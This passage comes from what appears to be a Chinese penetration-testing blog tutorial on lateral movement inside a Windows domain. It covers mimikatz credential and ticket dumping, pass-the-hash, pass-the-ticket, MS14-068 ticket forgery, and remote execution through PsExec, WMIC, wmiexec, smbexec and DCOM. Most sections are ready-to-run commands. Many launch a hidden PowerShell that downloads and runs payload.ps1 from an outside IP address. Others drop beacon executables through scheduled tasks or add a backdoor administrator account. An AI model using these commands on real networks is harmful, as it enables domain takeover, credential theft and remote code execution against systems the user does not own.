协议中的凭据你就看不到了！</p>\n<p><strong>抓取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa:ekeys</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210182917579.png\" alt=\"image-20221210182917579\"></p>\n<p>传递域中 administrator 的 aes256key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::pth /user:administrator /domain:hack.com /aes256:b03fcae60f0b32a105a8082e89a09cd88a5a6c54b0a209caaa9664c6bc223232</span><br></pre></td></tr></table></figure>\n<p>传递后在被控机器上弹出一个 system 权限的 cmd</p>\n<p>但是横向时需要使用主机名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\2012-1.hack.com</span><br><span class=\"line\">copy C:\\Users\\admin\\Desktop\\wanli.exe \\\\2012-1.hack.com\\C$</span><br><span class=\"line\">schtasks /create /s 2012-1.hack.com /tn test /sc onstart /tr c:\\wanli.exe /ru system /f</span><br><span class=\"line\">schtasks /run /s 2012-1.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pass-the-ticket-票据传递攻击ptt横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-ticket-票据传递攻击ptt横向攻击\">#</a> <strong>pass the ticket</strong> 票据传递攻击 (PTT) 横向攻击</h3>\n<p>要想使用 mimikatz 的哈希传递功能，必须具有本地管理员权限。 mimikatz 同样提供了不需要本地管理员权限进行 横向渗透测试的方法，</p>\n<p>例如票据传递 (PassThe Ticket,PTT)</p>\n<p>票据传递是基于 kerberos 认证的一种攻击方式，常用来做后渗透权限维持。</p>\n<p>黄金票据攻击利用的前提是得到了域内 krbtgt 用户的 NTLM 哈希或 AES-256 的值。</p>\n<p>白银票据攻击利用的前提是得到了域内服务账号的 HTML 哈希或 AES-256 的值。</p>\n<p>票据传递攻击一般分为两种</p>\n<p>1、自己制作票据</p>\n<p>2、传递内存中的票据</p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>执行以上命令后，会在当前目录下出现多个服务的票据文件，例如 krbtgt、cifs、ldap 等。</p>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br><span class=\"line\">两个都是清除票据</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>查看票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist</span><br><span class=\"line\">mimikatz kerberos::tgt</span><br></pre></td></tr></table></figure>\n<p>访问机器 (admin 用户没有过 uac)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\2012-1.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>横向后都是 system 权限</strong></p>\n<h3 id=\"ptt攻击之ms14-068传递获取域管横向\"><a class=\"markdownIt-Anchor\" href=\"#ptt攻击之ms14-068传递获取域管横向\">#</a> <strong>PTT 攻击之 ms14-068 传递获取域管横向</strong></h3>\n<p>ms14-068 漏洞主要通过伪造域管的 TGT，<strong>将普通用户权限提权为域管权限</strong>，以此来控制域控。只要服务器未打 ms14-068 补丁（KB3011780），在 server 2000 以上的域控服务器中，都可进行利用</p>\n<p><strong>MS14-068 的利用条件</strong></p>\n<p>1、获取域普通用户的账号密码</p>\n<p>2、获取域普通用户的 sid</p>\n<p>3、服务器未打 KB3011780 补丁</p>\n<p>查看域用户的 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">klist purge</span><br></pre></td></tr></table></figure>\n<p>生成票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控</span><br></pre></td></tr></table></figure>\n<p>执行后会生成一张伪造的 tgt</p>\n<p>导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::ptc 票据名字</span><br></pre></td></tr></table></figure>\n<p>执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc2.test.com\\c$ 注意是机器名不是IP</span><br></pre></td></tr></table></figure>\n<p><strong>goldenPac.exe</strong></p>\n<p>此工具是 impacket 工具包里的，它是 MS14-068+psexec 的组合，因此使用起来非常放方便快捷</p>\n<p>用法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">goldenPac.exe 域名/域用户名:域用户明文密码@域控完整域名</span><br></pre></td></tr></table></figure>\n<h3 id=\"psexec工具远程命令执行横向移动\"><a class=\"markdownIt-Anchor\" href=\"#psexec工具远程命令执行横向移动\">#</a> <strong>PsExec 工具远程命令执行横向移动</strong></h3>\n<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec 的使用不需要对方主机开方 3389 端口，只需要对方开启 admin<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>共享和</mtext><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">共享和ipc</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord cjk_fallback\">共</span><span class=\"mord cjk_fallback\">享</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">c</span></span></span></span> (该共享默认开启，依赖于 445 端口)。但是，假如目标主机开启了防火墙（防火墙禁止 445 端口连接），psexec 也是不能使用的，会提示找不到网络路径。由于 psexec 是 Windows 提供的工具，所以杀毒软件将其列在白名单中</p>\n<p><strong>PsExec 使用条件</strong></p>\n<p>1、具有正确的凭证（内存凭证、账号密码、账号 NTLM Hash）</p>\n<p>2、能建立 IPC 链接（也就是需要通过 smb 认证的），且目标机器开启了共享（默认开启的），并且目标共享中必须有 admin$ 共享</p>\n<p><strong>PsExec 常用参数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec \\\\ip -u administrator -p admin cmd 进⼊半交互式shell</span><br><span class=\"line\">PsExec -accepteula \\\\192.168.108.101 -s cmd.exe 建立交互的shell</span><br><span class=\"line\">psexec \\\\ip - uadministrator -p admin -w c:\\cmd 进⼊交互式shell，且c:\\是⽬标机器的⼯作⽬录</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin whoami all 执行命令</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -d c:\\beacon.exe 执行文件</span><br><span class=\"line\">psexec \\\\ip -u administrator -p admin -h -d c:\\beacon.exe UAC的⽤⼾权限执行文件</span><br></pre></td></tr></table></figure>\n<p>第一次使用时会弹窗，加上 accepteula 取消弹窗</p>\n<p><strong>IPC$ 下的 psexec</strong></p>\n<p>建立 IPC$ 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.150\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>直接执行命令，建立 ipc 后无需输入密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s cmd.exe 返回交互shell（必须是msf或者远程到桌面CS不行）</span><br><span class=\"line\">psexec.exe -accepteula \\\\192.168.41.150 -s ipconfig 远程执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>PTH 下的 psexec</strong></p>\n<p>进行 psexec 攻击上线</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211180427093.png\" alt=\"image-20221211180427093\"></p>\n<p><strong>PTT 下的 psexec</strong></p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure>\n<p>清除内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell klist purge</span><br><span class=\"line\">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>\n<p>将高权限的票据文件注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;998d7]-2-0-40e10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psexec.exe \\\\dc.hack.com -h -d c:\\wanli.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"wmic远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#wmic远程执行命令横向移动\">#</a> <strong>WMIC 远程执行命令横向移动</strong></h3>\n<p>WMIC 扩展 WMI（Windows Management Instrumentation，Windows 管理工具） ，提供了从命令行接口和批处理脚本执行系统管理的支持。</p>\n<p>简单来说：wmic 就是 wmic.exe，位于 windows 目录底下，是一个命令行程序。WMIC 可以以两种模式执行：交互模式 (Interactive mode) 和非交互模式 (Non-Interactive mode)，WMI 就是 WindowsManagement Instrumentation（Windows 管理规范）。它是 Windows 中的一个核心管理技术。</p>\n<p><strong>wmic 命令需要本地管理员或域管理员才可以进行正常使用</strong>，普通权限用户若想要使用 wmi，可以修改普通用户的 ACL，不过修改用户的 ACL 也需要管理员权限，普通用户使用 wmic。以下命令均在 2008R2、2012R2、2016 上进行测试，部分命令在虚拟机中测试不行。</p>\n<p><strong>wmic 调用 cmd</strong></p>\n<p>以下命令需要管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行命令并且输出</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c ipconfig &gt;c:\\ip.txt&quot;</span><br><span class=\"line\">列出远程主机进程</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process list brief</span><br><span class=\"line\">在远程系统上执行bat脚本</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create c:\\programdata\\test.bat</span><br><span class=\"line\">wmic /node:IP地址 /user:本地用户管理员/域管理员 /password:密码 process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span><br><span class=\"line\">执行powershell上线</span><br><span class=\"line\">wmic /NODE:IP /user:本地用户管理员/域管理员 /password:密码 PROCESS call create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;ps脚本地址&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用 cs 生成 powershell 脚本</p>\n<p>2、wmic 进行上线，把 ps1 放大公网，可以使用 python 开启 http 服务提供下载 python-m http.server 9988</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /NODE:192.168.41.148 /user:administrator /password:Admin@123 PROCESS call</span><br><span class=\"line\">create &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Wmiexec 工具</strong></p>\n<p>wmiexec 是一个即有全交互也有半交互的远程命令执行工具，有 python 版本的 pe 版本可运用于多种环境，包括 webshell 环境、rdp 环境、socks 环境等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe 域名/用户名:密码@目标IP &quot;ipconfig&quot; #执行命令</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP #哈希传递获得shell</span><br><span class=\"line\">wmiexec.exe -hashes LM Hash:NT Hash 域名/用户名@目标IP &quot;ipconfig&quot; #执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>利用 powershell 上线</strong></p>\n<p>1、使用账号密码登录进行 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe administrator:Admin@123@192.168.41.40 &quot;powershell.exe -nop -w hidden</span><br><span class=\"line\">-c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p>2、使用 hash 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmiexec.exe -hashes</span><br><span class=\"line\">aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab</span><br><span class=\"line\">administrator@192.168.41.40 &quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>wmiexec.vbs</strong></p>\n<p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式 Shell。wmiexec.vbs 支持两种模式，一种是半交互式 shell 模式，另一种是执行单条命令模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd IP 用户 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure>\n<p>使用 powershell 上线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript.exe //nologo wmiexec.vbs /cmd 192.168.41.148 administrator Admin@123</span><br><span class=\"line\">&quot;powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIExec</strong></p>\n<p>Invoke-WMIExec 是一个 powershell 脚本在 Invoke-TheHash 的文件中用法如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash-Command &quot;calc.exe&quot;</span><br><span class=\"line\">-verbose</span><br></pre></td></tr></table></figure>\n<p>采用无文件落地的方式进行横向</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object</span><br><span class=\"line\">System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:9988/Invoke\u0002WMIExec.ps1&#x27;);import-module .\\Invoke-WMIExec.ps1;Invoke-WMIExec -Target</span><br><span class=\"line\">192.168.41.148 -Username administrator -Hash 570a9a65db8fba761c1008a51d4c95ab -</span><br><span class=\"line\">Command &quot;whoami&quot; -verbose</span><br></pre></td></tr></table></figure>\n<p>本地执行</p>\n<p>1、导入脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import powershell/Invoke-WMIExec.ps1</span><br></pre></td></tr></table></figure>\n<p>2、运行上线命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell Invoke-WMIExec -Target 192.168.41.20 -Username administrator -Hash</span><br><span class=\"line\">570a9a65db8fba761c1008a51d4c95ab -Command &quot;powershell.exe -nop -w hidden -c IEX</span><br><span class=\"line\">((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">verbose</span><br></pre></td></tr></table></figure>\n<p><strong>Invoke-WMIMethod.ps1</strong></p>\n<p>该模块为 Powershell 内置模块，以下为示例，可以自由组合命令进行测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$User #目标系统用户名</span><br><span class=\"line\">$Password #目标系统密码</span><br><span class=\"line\">$Cred #账号密码整合，导入Credential</span><br><span class=\"line\">Invoke-WMIMethod #远程运行指定程序</span><br><span class=\"line\">#####---------------------------#####</span><br><span class=\"line\">$User = &quot;administrator&quot;</span><br><span class=\"line\">$Password= ConvertTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class=\"line\">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -</span><br><span class=\"line\">ArgumentList $User , $Password</span><br><span class=\"line\">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe</span><br><span class=\"line\">-nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; -</span><br><span class=\"line\">ComputerName &quot;192.168.41.20&quot; -Credential $Cred</span><br></pre></td></tr></table></figure>\n<h3 id=\"smb远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#smb远程执行命令横向移动\">#</a> <strong>SMB 远程执行命令横向移动</strong></h3>\n<p>SMB 全称是 Server Message Block 翻译过来是服务器信息块，它也是一种客户端到服务器的通信协议。除此之外，SMB 协议也被称为请求 - 回复协议。 客户端与服务器建立连接后，客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。</p>\n<p>利用条件：开启了 445 端口</p>\n<p><strong>smbexec 使用</strong></p>\n<p>smbexec 为 impacket 工具中的工具，操作简单，容易被杀，使用时无需先进行 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文传递命令：</span><br><span class=\"line\">smbexec hsyy.com/administrator:123.com@192.168.213.163</span><br><span class=\"line\">hash传递：</span><br><span class=\"line\">smbexec -hashes :$HASH$ ./admin@192.168.213.163</span><br><span class=\"line\">smbbexec -hashes :$HASH$ domain/admin@192.168.213.163</span><br></pre></td></tr></table></figure>\n<p><strong>使用明文</strong></p>\n<p>1、输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec administrator:Admin@123@192.168.41.148</span><br></pre></td></tr></table></figure>\n<p><strong>使用 hash</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbexec -hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab administrator@192.168.41.148</span><br></pre></td></tr></table></figure>\n<h3 id=\"dcom远程执行命令横向移动\"><a class=\"markdownIt-Anchor\" href=\"#dcom远程执行命令横向移动\">#</a> <strong>DCOM 远程执行命令横向移动</strong></h3>\n<p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求，使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件</p>\n<p><strong>获取 DCOM 列表</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-CimInstance Win32_DCOMApplication</span><br><span class=\"line\">Get-CimInstance -classWin32_DCOMApplication | select appid,name</span><br><span class=\"line\">Get-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>\n<p><strong>DCOM 横向前提</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、需要关闭系统防火墙</span><br><span class=\"line\">2、必须拥有管理员权限</span><br><span class=\"line\">3、在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</span><br></pre></td></tr></table></figure>\n<p><strong>MMC20.Application 远程执行命令</strong></p>\n<p>1、通过 PowerShell 与 DCOM 进行远程交互，此外，我们只需要提供一个 DCOM ProgID 和一个 IP 地址，然后，它就从远程返回一个 COM 对象的实例。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com =</span><br><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0</span><br><span class=\"line\">.0.1&quot;))</span><br></pre></td></tr></table></figure>\n<p>2、然后执行如下命令，我们就可以调用 &quot;ExecuteShellCommand&quot; 方法在远程主机上启动进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c</span><br><span class=\"line\">calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>\n<p>3、将 IP 和命令换成上线的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.1</span><br><span class=\"line\">68.41.147&quot;))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;Mini</span><br><span class=\"line\">mzed&quot;)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellWindows 远程执行命令</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;</span><br><span class=\"line\">/c calc.exe&quot;,&quot;c:windowssystem32&quot;,$null,0) 打开本地计算器</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-</span><br><span class=\"line\">00A0C90A8F39&#x27;,&quot;192.168.41.147&quot;)).item().Document.Application.ShellExecute(&quot;cmd.e</span><br><span class=\"line\">xe&quot;,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>ShellBrowserWindow 远程执行命令</strong></p>\n<p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-</span><br><span class=\"line\">00A0C91F3880&quot;,&quot;192.168.41.147&quot;)).Document.Application.shellExecute(&quot;cmd.exe&quot;,&quot;/c</span><br><span class=\"line\">powershell.exe -nop -w hidden -c IEX ((new-object</span><br><span class=\"line\">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:wi</span><br><span class=\"line\">ndowssystem32&quot;,$null,0)</span><br></pre></td></tr></table></figure>\n<p><strong>调用 Excel.Application 远程执行命令</strong></p>\n<p>目标主机中安装有 excle</p>\n<p>1、 通过 PowerShell 与 DCOM 进行远程交互，创建 Excel.Application 对象的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 